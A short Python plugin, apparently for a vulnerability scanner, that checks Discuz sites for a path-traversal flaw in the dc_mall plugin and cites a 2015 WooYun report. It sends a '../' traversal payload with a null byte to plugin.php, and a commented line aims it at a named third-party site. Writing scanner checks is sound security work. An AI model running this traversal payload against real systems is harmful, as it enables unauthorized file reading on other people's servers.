#!/usr/bin/env python
# -*- coding: utf-8 -*-
#_Author_= hear7v 
#_Refer_ = http://www.wooyun.org/bugs/wooyun-2015-0131386
import requests
def assign(service, arg):
    if service == "discuz":
        return True, arg

def audit(arg):
    payload = 'plugin.php?action=../../../../../robots.txt%00&id=dc_mall'
    url = arg + payload
    try:
        req = requests.get(url, timeout=5)
        if req.status_code == 200 and "User-agent" in req.content and 'robots.txt for Discuz' in req.content and 'Disallow:' in req.content:
            security_hole(url)
    except requests.Timeout:
        pass

# if __name__ == '__main__':
#     from dummy import *
#     audit(assign('discuz', 'http://www.zhukaocidian.com/')[1])
